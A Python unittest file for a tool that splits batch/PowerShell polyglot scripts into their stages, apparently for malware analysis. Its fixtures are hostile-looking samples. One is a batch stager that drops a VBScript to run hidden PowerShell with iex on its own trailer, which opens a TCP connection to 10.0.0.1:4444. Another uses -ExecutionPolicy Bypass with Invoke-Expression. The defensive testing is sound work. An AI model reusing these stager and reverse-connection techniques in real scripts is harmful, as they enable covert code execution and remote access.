"""C2 -- bat_split_polyglot: separate the cmd-executable region from an
embedded PowerShell / VBScript payload.
"""
import unittest

from tests._harness import run_cli_outdir


class TestTrailingPayload(unittest.TestCase):
    SRC = ('@echo off\r\n'
           'setlocal EnableDelayedExpansion\r\n'
           'echo CreateObject("WScript.Shell").Run "powershell -w hidden -c iex((gc -Raw \'%~f0\') '
           '-replace \'(?s)^.*__PS__\\r?\\n\',\'\')", 0 > "%TEMP%\\r.vbs"\r\n'
           'wscript.exe "%TEMP%\\r.vbs"\r\n'
           'exit /b 0\r\n'
           '\r\n'
           '__PS__\r\n'
           '$c = New-Object Net.Sockets.TcpClient("10.0.0.1", 4444)\r\n'
           '$s = $c.GetStream()\r\n'
           'while ($true) { Start-Sleep 5 }\r\n')

    def test_splits_at_exit_and_strips_marker(self):
        r = run_cli_outdir('bat_split_polyglot.py', self.SRC)
        self.addCleanup(r.cleanup)
        self.assertEqual(len(r.manifest['stages']), 1)
        st = r.manifest['stages'][0]
        self.assertEqual(st['file'], 'stage_trailer.ps1')
        self.assertEqual(st.get('marker'), '__PS__')
        trailer = r.read('stage_trailer.ps1').decode('utf-8')
        self.assertIn('TcpClient', trailer)
        self.assertNotIn('__PS__', trailer)
        self.assertNotIn('@echo off', trailer)

    def test_batch_region_keeps_only_the_batch(self):
        r = run_cli_outdir('bat_split_polyglot.py', self.SRC)
        self.addCleanup(r.cleanup)
        region = r.read('batch_region.cmd').decode('utf-8')
        self.assertIn('wscript.exe', region)
        self.assertIn('exit /b 0', region)
        self.assertNotIn('TcpClient', region)


class TestHeadPolyglot(unittest.TestCase):
    def test_hash_bracket_prologue(self):
        src = ('<# : batch section\r\n'
               '@echo off\r\n'
               'powershell -NoProfile -ExecutionPolicy Bypass -File "%~f0"\r\n'
               'exit /b\r\n'
               '#>\r\n'
               '$payload = "malicious"\r\n'
               'Invoke-Expression $payload\r\n'
               'Write-Host done\r\n')
        r = run_cli_outdir('bat_split_polyglot.py', src)
        self.addCleanup(r.cleanup)
        self.assertEqual(len(r.manifest['stages']), 1)
        self.assertIn('polyglot prologue', r.manifest['stages'][0]['origin'])
        trailer = r.read('stage_trailer.ps1').decode('utf-8')
        self.assertIn('Invoke-Expression', trailer)
        self.assertNotIn('@echo off', trailer)


class TestNoSplit(unittest.TestCase):
    def test_pure_batch_is_left_alone(self):
        src = ('@echo off\r\n'
               'set "X=1"\r\n'
               'echo %X%\r\n'
               'goto :eof\r\n')
        r = run_cli_outdir('bat_split_polyglot.py', src)
        self.addCleanup(r.cleanup)
        self.assertEqual(r.manifest['stages'], [])

    def test_short_trailer_is_not_a_stage(self):
        src = '@echo off\r\necho hi\r\nexit /b 0\r\n\r\nleftover one line\r\n'
        r = run_cli_outdir('bat_split_polyglot.py', src)
        self.addCleanup(r.cleanup)
        self.assertEqual(r.manifest['stages'], [])


if __name__ == '__main__':
    unittest.main()
